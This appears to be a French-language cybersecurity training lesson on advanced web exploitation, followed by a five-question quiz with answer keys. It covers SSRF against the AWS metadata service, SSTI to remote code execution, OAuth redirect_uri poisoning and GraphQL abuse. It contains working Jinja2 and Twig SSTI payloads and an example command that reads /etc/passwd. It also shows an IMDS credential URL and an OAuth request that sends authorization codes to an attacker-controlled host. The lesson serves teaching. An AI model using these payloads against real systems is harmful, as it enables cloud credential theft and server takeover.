# TOME P8 — Blue Team, SOC & SIEM Advanced — Jour 383 (6h) : Web Application Red Team — Advanced Exploitation (Server-Side Request Forgery — SSRF, SSTI, OAuth 2.0 Token Theft & GraphQL Vulnerabilities)

> [!NOTE]
> **Objectif du jour :** Maîtriser l'exploitation avancée des applications Web de niveau d'expertise **BSCP (Burp Suite Certified Practitioner)** : exploiter les vulnérabilités **SSRF (Server-Side Request Forgery)** pour pivoter vers les métadonnées Cloud (AWS IMDSv1/v2), orchestrer des injections de modèles d'injection **SSTI (Server-Side Template Injection)** pour obtenir l'exécution de code à distance (RCE), détourner les flux **OAuth 2.0 / OIDC** (redirect_uri abuse, token theft), et auditer les APIs **GraphQL** (introspection abuse, batching attacks).
>
> **Compétences visées :** `RED-WEB-01` (A) — Advanced Web Vulnerability Exploitation (SSRF Cloud Pivot, SSTI RCE) | `RED-WEB-02` (A) — OAuth 2.0 / OIDC Token Hijacking & GraphQL API Security Auditing

---

## 1) Module — Web Exploitation Vectors & Cloud Pivoting (2h)

### 📖 Narration/Intuition

Dans les architectures web modernes (Microservices, Single Page Apps, Multi-Cloud), les vulnérabilités ne se limitent plus aux SQLi basiques. Une vulnérabilité **SSRF** sur une API web permet d'interroger le service de métadonnées interne du Cloud (**AWS IMDSv1/v2**) et d'extraire les clés d'accès temporaires IAM du rôle de l'instance.

```
  [ RED TEAM OPERATOR / BURP SUITE ]
                 │
                 │ 1. POST /api/v1/fetch_avatar
                 │    url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role
                 ▼
  [ SERVEUR WEB VULNÉRABLE (SSRF) ]
                 │
                 │ 2. Requête Interne non filtrée (Lien d'Administration Cloud)
                 ▼
  [ METADATA SERVICE AWS IMDS (169.254.169.254) ]
                 │
                 │ 3. Réponse JSON contenant AccessKeyId, SecretAccessKey, Token
                 ▼
  [ CLÉS IAM AWS RECUEILLIES PAR L'ATTAQUANT ] ──► PIVOTEMENT DANS LE CLOUD !
```

#### Comparatif des Vulnérabilités Web Avancées

| Vulnérabilité | Mécanisme d'Attaque | Impact Majeur | Niveau BSCP |
|:---:|:---|:---|:---:|
| **SSRF (Cloud IMDS)** | Injection d'URL interne sur un paramètre applicatif | Extraction de crédentiels Cloud IAM / Pivot interne | **Avancé** |
| **SSTI (Jinja2 / Twig)** | Injection de code de modèle via des paramètres non nettoyés | Exécution de code à distance (RCE) | **Avancé** |
| **OAuth 2.0 Redirect Abuse** | Manipulation de `redirect_uri` lors du callback OAuth | Vol de Token d'Accès / Impersonation | **Avancé** |
| **GraphQL Batching / Introspection** | Contournement de rate-limiting via des requêtes imbriquées | Brute-force massif / Disclosure de schéma | **Moyen** |

---

## 2) Module — Outillage Web Vulnerability Exploitation Engine (`web_redteam_engine.py`) (2h)

### 🛠️ Atelier Pratique

```python
import json
import urllib.parse
from datetime import datetime, timezone
from typing import List, Dict

class WebRedTeamEngine:
    """
    Moteur de simulation d'exploitation web avancée (SSRF, SSTI, OAuth Abuse).
    Génère les payloads d'attaque et extrait les artéfacts de compromission.
    """

    def __init__(self, target_url: str, operator: str):
        self.target = target_url
        self.operator = operator
        self.exploits_run: List[dict] = []

    def exploit_ssrf_aws_imds(self, parameter_name: str, imds_version: str = "v1") -> dict:
        """
        Simule l'exploitation d'une vulnérabilité SSRF pour extraire les identifiants IAM AWS.
        IMDSv1 Endpoint: http://169.254.169.254/latest/meta-data/iam/security-credentials/
        """
        if imds_version == "v1":
            target_metadata_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Prod-Role"
        else:
            target_metadata_url = "http://169.254.169.254/latest/api/token" # IMDSv2 exige un Header PUT Token

        payload = urllib.parse.quote(target_metadata_url)
        full_attack_url = f"{self.target}?{parameter_name}={payload}"

        # Simulation de la réponse extraite du Metadata Service AWS
        extracted_iam_credentials = {
            "Code": "Success",
            "LastUpdated": "2026-08-09T20:00:00Z",
            "Type": "AWS-HMAC",
            "AccessKeyId": "ASIA" + "MOCKKEY123456789",
            "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "Token": "IQoJb3JpZ2luX2VjEFAa..."
        }

        result = {
            "exploit_type": "SSRF_AWS_IMDS",
            "parameter": parameter_name,
            "attack_url": full_attack_url,
            "stolen_credentials": extracted_iam_credentials,
            "impact": "CRITICAL_CLOUD_CREDENTIAL_LEAK"
        }
        self.exploits_run.append(result)
        print(f"  [!] SSRF EXPLOIT SUCCESSFUL -> Clés IAM AWS extraites via IMDS {imds_version} !")
        return result

    def generate_ssti_rce_payload(self, engine: str, command: str) -> str:
        """
        Génère un payload d'injection SSTI (Server-Side Template Injection) pour Jinja2 (Python).
        """
        if engine.lower() == "jinja2":
            # Payload Jinja2 classique pour exécuter os.popen(command)
            payload = f"{{{{ self.__init__.__globals__.__builtins__.__import__('os').popen('{command}').read() }}}}"
        elif engine.lower() == "twig":
            payload = f"{{{{_self.env.registerUndefinedFilterCallback('system')}}}}{{{{_self.env.getFilter('{command}')}}}}"
        else:
            payload = f"{{{{7*7}}}}"

        result = {
            "exploit_type": "SSTI_RCE",
            "template_engine": engine,
            "command": command,
            "generated_payload": payload,
            "impact": "REMOTE_CODE_EXECUTION"
        }
        self.exploits_run.append(result)
        print(f"  [!] SSTI PAYLOAD GENERATED ({engine}) -> Command: {command}")
        return payload

    def generate_web_redteam_report(self) -> dict:
        return {
            "target": self.target,
            "operator": self.operator,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "total_exploits_executed": len(self.exploits_run),
            "exploits": self.exploits_run
        }

# Démonstration Web Red Team Engine
web_rt = WebRedTeamEngine("https://app.paradis-bank.com/profile/fetch_image", "RT_WEB_EXPERT")

print("=== WEB APPLICATION RED TEAM EXPLOITATION ENGINE ===")

# Exploit 1 : SSRF AWS IMDS Extraction
web_rt.exploit_ssrf_aws_imds(parameter_name="url", imds_version="v1")

# Exploit 2 : SSTI RCE Jinja2 Payload
web_rt.generate_ssti_rce_payload(engine="jinja2", command="id; uname -a; cat /etc/passwd")

print("\n=== WEB RED TEAM REPORT ===")
print(json.dumps(web_rt.generate_web_redteam_report(), indent=2, ensure_ascii=False))
```

---

## 3) Module — Fiche technique OAuth 2.0 Redirect URI Poisoning (2h)

```markdown
# OAUTH 2.0 TOKEN THEFT VIA REDIRECT_URI POISONING

## 1. Principe du Détournement de Callback OAuth 2.0
Si le serveur d'autorisation n'exécute pas une validation stricte (exact match) de l'argument `redirect_uri`, un attaquant peut intercepter les codes d'autorisation ou jetons d'accès.

```http
# Requête d'Authentification OAuth Légitime
GET /auth?client_id=bank_app&redirect_uri=https://app.paradis-bank.com/callback&response_type=code

# Requête Manipulée par l'Attaquant (Redirect URI Poisoning)
GET /auth?client_id=bank_app&redirect_uri=https://attacker-controlled-server.com/cb&response_type=code
```

## 2. Exploitation du Paramètre State manquant (CSRF OAuth)
L'absence ou la mauvaise vérification du paramètre cryptographique `state` permet de forcer un compte utilisateur victime à lier son profil au compte de l'attaquant (**Account Hijacking**).
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **SSRF** | Server-Side Request Forgery — Vulnérabilité forçant le serveur web à exécuter des requêtes réseau HTTP internes |
| **SSTI** | Server-Side Template Injection — Injection de code dans un moteur de rendu de templates conduisant à la RCE |
| **IMDS** | Instance Metadata Service — Service HTTP interne AWS/GCP fournissant les métadonnées et identifiants de l'hôte |

---

## ❓ Banque de Questions & Test du Jour (5 QCM)

**Q1 :** Quelle est l'adresse IP et le chemin universel réservés au service de métadonnées d'instance **AWS IMDSv1** couramment ciblé par une vulnérabilité **SSRF** ?
- A) `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- B) `http://127.0.0.1:8080/admin/keys`
- C) `http://192.168.1.1/aws_credentials`
- D) `http://10.0.0.1/metadata/`

**Réponse : A**

**Q2 :** Comment la version **IMDSv2** d'AWS se protège-t-elle contre les vulnérabilités SSRF simples ?
- A) En exigeant une requête `PUT` initiale pour obtenir un jeton de session (`X-aws-ec2-metadata-token`), puis l'envoi de ce jeton dans un header HTTP lors de la requête `GET` subséquente
- B) En supprimant les clés d'accès
- C) En utilisant le protocole FTP au lieu d'HTTP
- D) En exigeant un mot de passe utilisateur

**Réponse : A**

**Q3 :** Quel est l'impact maximal d'une vulnérabilité de type **SSTI (Server-Side Template Injection)** non remediée ?
- A) L'exécution de code arbitraire à distance (Remote Code Execution — RCE) sur le serveur web hébergeant le moteur de template
- B) Le changement de couleur de la page web
- C) La redirection vers Google
- D) L'affichage d'un message d'erreur HTTP 404

**Réponse : A**

**Q4 :** Dans un flux OAuth 2.0, à quoi sert la validation stricte de l'argument **`redirect_uri`** par le serveur d'autorisation ?
- A) À s'assurer que le code d'autorisation ou le jeton d'accès n'est envoyé qu'à un domaine et une URL dûment enregistrés et vérifiés, évitant ainsi le vol de jetons par un serveur attaquant
- B) À accélérer le temps de chargement de la page
- C) À vérifier la taille du mot de passe
- D) À compresser les requêtes HTTP

**Réponse : A**

**Q5 :** Quelle fonctionnalité des APIs **GraphQL** est souvent exploitée par les attaquants pour découvrir l'intégralité du schéma, des types et des requêtes disponibles sur un serveur web ?
- A) L'**Introspection Query** (`__schema`) si elle est laissée activée en environnement de production
- B) Le système de commentaires HTML
- C) Le fichier `robots.txt`
- D) Les cookies de session PHP

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*